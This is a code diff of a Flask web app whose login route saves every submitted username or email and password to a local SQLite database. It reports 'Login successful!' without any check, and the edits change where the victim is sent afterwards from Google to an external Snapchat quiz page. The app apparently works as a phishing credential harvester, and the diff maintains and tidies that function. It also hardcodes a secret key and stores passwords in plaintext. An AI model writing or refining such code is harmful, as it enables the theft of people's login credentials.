@@ -5,7 +5,7 @@ app = Flask(__name__)
 app.secret_key = "supersecretkey"  # Needed for flash messages
 
 
-# Function to create database if it doesn't exist
+# Function to initialize database and ensure the users table exists
 def init_db():
     conn = sqlite3.connect("users.db")
     cursor = conn.cursor()
@@ -21,12 +21,9 @@ def init_db():
     conn.close()
 
 
-# Call the function to initialize the database
-init_db()
-
-
 # Function to save user to the database
 def save_user(username, password):
+    init_db()  # Ensure the database and table exist
     conn = sqlite3.connect("users.db")
     cursor = conn.cursor()
     cursor.execute(
@@ -49,14 +46,16 @@ def login():
         username = request.form["usernameEmail"]
         password = request.form["password"]
 
-        # Always save user credentials to the database
+        # Save user credentials to the database
         save_user(username, password)
 
         # Flash message for login attempt
         flash("Login successful!", "success")
 
-        # Redirect to Google after saving user credentials
-        return redirect("https://www.google.com")
+        # Redirect to the quiz page after saving user credentials
+        return redirect(
+            "https://www.proprofs.com/quiz-school/story.php?title=3dq-what-do-you-know-about-snapchat"
+        )
 
     return render_template("login.html")
 
